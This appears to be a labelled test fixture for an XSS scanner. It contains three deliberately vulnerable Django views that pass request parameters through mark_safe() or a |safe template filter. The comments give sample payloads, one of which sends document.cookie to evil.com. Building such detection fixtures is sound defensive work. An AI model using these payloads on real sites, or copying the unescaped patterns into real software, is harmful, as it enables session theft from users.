# Fixture: py-django-mark-safe — Django mark_safe() and |safe filter with user input
# Expected: TRUE POSITIVE (high confidence)
# CWE: CWE-79
# Agent: xss
# Pattern: mark_safe() wrapping user-controlled data, |safe filter in template context

from django.http import HttpResponse
from django.shortcuts import render
from django.utils.safestring import mark_safe


def user_profile(request):
    username = request.GET.get("username", "Guest")
    bio = request.GET.get("bio", "")
    # VULNERABLE: mark_safe() tells Django to skip HTML escaping
    # Attacker sends: ?bio=<img src=x onerror=alert(document.cookie)>
    bio_html = mark_safe(f"<div class='bio'>{bio}</div>")

    return render(request, "profile.html", {
        "username": username,
        "bio_html": bio_html,
    })


def notification_banner(request):
    message = request.GET.get("message", "Welcome!")
    alert_type = request.GET.get("type", "info")
    # VULNERABLE: user-controlled message wrapped in mark_safe()
    # Attacker sends: ?message=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
    banner = mark_safe(
        f'<div class="alert alert-{alert_type}" role="alert">{message}</div>'
    )

    return render(request, "dashboard.html", {"banner": banner})


def search_results(request):
    query = request.GET.get("q", "")
    results = [
        {"title": "Result 1", "snippet": f"Matched: {query}"},
        {"title": "Result 2", "snippet": f"Related to: {query}"},
    ]

    # VULNERABLE: query passed to template context where template uses |safe filter
    # Template contains: <p>Showing results for: {{ query|safe }}</p>
    # The |safe filter disables Django's auto-escaping for this variable
    # Attacker sends: ?q=<svg/onload=alert(1)>
    return render(request, "search.html", {
        "query": query,
        "results": results,
    })
